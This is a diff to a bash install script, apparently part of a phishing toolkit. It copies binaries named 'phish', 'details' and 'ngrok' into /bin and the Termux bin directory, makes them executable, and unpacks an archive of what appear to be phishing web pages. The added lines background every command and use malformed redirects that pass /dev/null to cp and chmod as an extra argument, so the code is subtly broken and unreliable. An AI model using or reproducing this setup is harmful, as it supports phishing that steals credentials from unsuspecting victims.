@@ -1,13 +1,19 @@
 #! /bin/bash
 echo "removing all old phishing files"
 sleep 10
-cp -r details /bin
-cp -r phish /bin
-cp -r ngrok /bin
-chmod 775 /bin/phish
-chmod 775 /bin/details
-chmod 775 /bin/ngrok
-echo "installing files"
+cp -r details /bin /dev/null 2>&1  &
+cp -r phish /bin /dev/null 2>&1  &
+cp -r ngrok /bin /dev/null 2>&1  &
+chmod 775 /bin/phish /dev/null 2>&1  &
+chmod 775 /bin/details /dev/null 2>&1  &
+chmod 775 /bin/ngrok /dev/null 2>&1  &
+cp -r details /data/data/com.termux/files/usr/bin /dev/null 2>&1  &
+cp -r phish /data/data/com.termux/files/usr/bin /dev/null 2>&1  &
+cp -r ngrok /data/data/com.termux/files/usr/bin /dev/null 2>&1  &
+chmod 775 /data/data/com.termux/files/usr/bin/phish /dev/null 2>&1  &
+chmod 775 /data/data/com.termux/files/usr/bin/details /dev/null 2>&1  &
+chmod 775 /data/data/com.termux/files/usr/bin/ngrok /dev/null 2>&1  &
+echo "installing files" 
 sleep 10
 mkdir WebPages
 unzip WebPages1.zip
